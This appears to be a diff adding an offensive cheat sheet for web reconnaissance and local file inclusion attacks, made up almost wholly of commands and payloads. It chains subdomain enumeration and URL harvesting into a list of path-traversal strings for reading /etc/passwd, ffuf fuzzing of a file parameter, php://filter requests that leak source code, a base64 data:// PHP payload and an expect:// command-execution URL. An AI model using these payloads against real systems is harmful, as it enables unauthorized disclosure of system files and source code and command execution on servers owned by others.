@@ -1,0 +1,47 @@
+subfinder -d example.com -o subfinder.txt
+assetfinder --subs-only example.com > assetfinder.txt
+amass enum -passive -d example.com -o amass.txt
+curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh.txt
+cat subfinder.txt assetfinder.txt amass.txt crtsh.txt | sort -u > all_subs.txt
+
+dnsx -l all_subs.txt -o alive.txt
+httpx -l alive.txt -o live_http.txt -title -status-code -tech-detect -threads 100
+cat live_http.txt | sed 's/https\?:\/\///' > cleaned.txt
+
+cat cleaned.txt | waybackurls > wayback.txt
+cat cleaned.txt | gau > gau.txt
+cat wayback.txt gau.txt | sort -u > all_urls.txt
+
+cat all_urls.txt | gf lfi > lfi_candidates.txt
+
+Common Payload:
+/etc/passwd
+../../../../etc/passwd
+..%2f..%2f..%2fetc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+
+ffuf -u https://target.com/page.php?file=FUZZ -w lfi_payloads.txt -mc 200,403,500
+
+arjun -u https://target.com -o arjun.txt
+
+https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+https://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+https://example.com/index.php?page=expect://ls
+
+curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
+
+/etc/passwd
+../../../../etc/passwd
+../../../etc/passwd
+../../../../../../../../etc/passwd
+%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%252f..%252fetc%252fpasswd
+..%255c..%255cetc%255cpasswd
+/etc/passwd%00
+../../../../etc/passwd%00
+
+
+
